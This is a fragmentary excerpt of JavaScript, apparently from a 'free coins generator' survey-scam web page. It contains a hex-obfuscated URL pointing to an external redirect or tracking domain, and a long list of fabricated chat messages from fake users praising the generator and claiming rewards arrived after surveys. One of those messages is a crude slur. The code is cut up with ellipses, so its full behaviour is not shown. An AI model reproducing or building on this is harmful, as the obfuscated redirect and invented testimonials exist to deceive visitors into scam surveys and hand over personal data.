$(document).ready(function () {
  ...
  if (
    ...
    "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x64\x74\x72\x63\x6b\x32\x2e\x63\x6f\x6d\x2f\x35\x65\x38\x63\x62\x35\x34\x63\x61\x34\x35\x38\x30\x65\x30\x30\x30\x31\x30\x37\x37\x37\x35\x64"
  ) {
    0x0 >
      ...
      0x0 ==
        Math["\x66\x6c\x6f\x6f\x72"](
          (0x64 * Math["\x72\x61\x6e\x64\x6f\x6d"]()) / 0x5
        ) &&
  ...
  var chat_messages = [
    ...
    "Does it work in FFA?",
    "This works for me on FFA like a charm :D",
    ...
    "It took me 2 days to complete the game level for veritication, then i checked my account and the reward was there!",
    "LOL! I am here for my coins refill",
    "ROFL!",
    "Real",
    "gayyyy",
    "easy",
    ...
    "hi guys",
    "How much coins you've generated so far?",
    "what about surveys on mobile phone?",
    "Is this free?",
    "How long do you have to wait?",
    "This is my third time in this website for free coins!",
    "Yea",
    "No",
    "I know",
    ...
    "bye guys, already finish my survey, and resources generated successfully",
    "okay i am stacked now with survey",
    "finished survey is easy, if you fill using valid data",
    "incredible",
    "three minutes ago cannot get fast resource, now i have and its works perfectly",
    "need to go now",
    "brb",
    ...
    "after finish a survey you'll get the hack you choosed ",
    "today is lucky day",
    "this is the best generator because we all have more than a chance",
    "i think everyone can do a survey quickly",
    "can we get more than one survey ?, first time success, and want to try for my sister account",
    "yes",
    "abselutely",
